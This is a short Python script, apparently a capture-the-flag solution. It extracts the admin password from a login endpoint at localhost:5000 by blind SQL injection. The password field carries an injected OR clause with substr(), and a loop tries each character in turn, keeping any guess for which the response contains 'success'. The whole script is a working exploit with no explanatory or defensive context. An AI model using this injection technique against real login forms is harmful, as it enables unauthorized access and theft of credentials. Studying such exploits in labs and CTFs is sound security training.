import requests

def get_data(len, flag):
    data = {
        "username": "admin",
        "password": f"' OR username='admin' AND substr(password, 1, {len})='{flag}"
    }
    return data

charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}"
flag = ""
for i in range(1, 50):
    for c in charset:
        data = get_data(i, flag + c)
        r = requests.post("http://localhost:5000/login", data=data)
        if "success" in r.text:
            flag += c
            print(flag)
            break
    else:
        break